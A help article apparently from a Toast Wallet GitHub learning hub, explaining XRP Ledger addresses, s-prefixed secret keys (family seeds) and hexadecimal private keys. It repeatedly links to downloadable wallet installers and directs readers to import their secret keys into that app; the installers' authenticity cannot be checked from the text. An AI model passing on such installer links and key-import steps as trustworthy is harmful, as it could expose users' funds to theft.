<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet private key and family seed</h1>

<p align="center">The difference between secret key, family seed and private key.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

On the XRP Ledger, the "secret key" or "family seed" is a code beginning with `s` that controls one account. "Private key" is the general term for the key underneath it. Toast Wallet imports the `s` key directly through **+ → Import an existing account** in the [latest desktop wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

## 👀 You'll see this if

- A guide mentions a "family seed" and you are not sure what that is.
- You have a long string of characters and do not know whether it is an address or a key.
- You want to know which piece Toast Wallet needs to import an account.
- Someone asked you for your "private key" and you are unsure what they mean.

## 🤔 Why it matters

Crypto vocabulary is confusing because different wallets use different names for similar things. On the XRP Ledger, three terms matter. The **address** starts with `r`; it is public and you share it to receive XRP. The **secret key**, also called the **family seed**, starts with `s`; it is private and controls the account. The **private key** is the underlying number from which signing happens; many tools show it in a long hexadecimal form.

Knowing which is which protects you. You can share an `r` address freely. You must never share an `s` key or a private key. And when importing into Toast Wallet, the `s` key is the format to use.

## 🧭 Before you start

Look at the item you have and note its first character and length. An `r` at the start means an address. An `s` at the start usually means a secret key. A long string of only digits and letters `a` to `f` is likely a hexadecimal private key. Words mean a phrase from another wallet type.

## 🛠️ Fix: identify and use your key

1. **Address (`r...`).** Public. You cannot import an account with only the address; you can only view it.
2. **Secret key or family seed (`s...`).** Private. This is what Toast Wallet imports. Follow [import an XRP secret key into Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/import-xrp-secret-key-into-toast-wallet.md).
3. **Words (12 or 24).** Convert them offline to a secret key first, following [Toast Wallet seed phrase to secret key offline](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-seed-phrase-to-secret-key-offline.md).
4. **Toast six recovery words.** They are not a key at all; they unlock your Toast backup code.
5. **Long hexadecimal private key.** Toast Wallet's import uses the `s` format. Keep the hexadecimal key safe and use a secret key in `s` form where possible.
6. **After any import, back up.** Make a new Toast backup code.

## 🧩 Real-world example

A user finds two notes: one long string beginning with `r` and another shorter string beginning with `s`. They are tempted to post both in a forum to ask what they are. Instead, they recognise the `r` string as the public address and the `s` string as the family seed. They open Toast Wallet, choose **+ → Import an existing account**, enter the `s` key, and the account with the `r` address appears.

## ⚠️ Common mistakes

- Sharing a secret key in a forum or chat while asking for help.
- Thinking an `r` address can be imported to gain control of an account.
- Storing secret keys in password managers that sync to many devices without understanding the risk.
- Assuming "private key" in a support message means something harmless.

## 🔁 If that did not work

- **Toast rejects the key.** Check case and characters. Make sure it starts with `s`.
- **You want to see your own secret key.** See [export a Toast Wallet secret key safely](https://github.com/Toast-Wallet/learn/blob/main/how-to/export-toast-wallet-secret-key-safely.md).
- **Someone asks for any of your keys.** That is a scam; read [Toast Wallet fake support warning](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-fake-support-warning.md).

## 🛡️ Prevention

Write secret keys on paper only. Label clearly which account each belongs to by noting the first and last characters of the `r` address. Never share any key that starts with `s`.

## 🔍 A closer look at the three formats side by side

Seeing the formats next to each other helps. An address is roughly 25 to 35 characters and begins with `r`; it is printed on receipts, shown in explorers and safe to share. A secret key or family seed is about 29 characters and begins with `s`; it should exist only on paper and inside your wallet. A hexadecimal private key is much longer, made of digits and the letters `a` to `f`, and is usually shown only by technical tools.

When you store any of these, write a short label next to it: "address, public" or "secret key, private". It sounds obvious, but years later, labels are what stop someone from posting a secret in a forum or throwing away the one paper that matters.

There is one more practical habit worth adopting. For each secret key you keep, also write down the first and last characters of the address it controls. That way you can confirm, after importing, that the key and the address belong together, and you can tell several paper keys apart without ever having to type them anywhere.

## ❓ FAQ

<details>
<summary>Is the family seed the same as the secret key?</summary>

On the XRP Ledger these terms are commonly used for the same `s...` value.

</details>

<details>
<summary>Is my address secret?</summary>

No. Your `r` address is public. Share it to receive XRP.

</details>

<details>
<summary>Can a secret key be changed?</summary>

A secret key belongs to its account. To get a new key, create a new account and move your XRP.

</details>

> [!WARNING]
> Never share a key that starts with `s`, a private key or seed words with anyone, for any reason.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Import an XRP secret key into Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/import-xrp-secret-key-into-toast-wallet.md) | Add an existing account with its secret key starting with s. |
| [Export a Toast Wallet secret key safely](https://github.com/Toast-Wallet/learn/blob/main/how-to/export-toast-wallet-secret-key-safely.md) | View and store an account secret key without exposing it. |
| [Toast Wallet seed phrase to secret key offline](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-seed-phrase-to-secret-key-offline.md) | Turn 12 or 24 words into an XRP secret key with the internet off. |
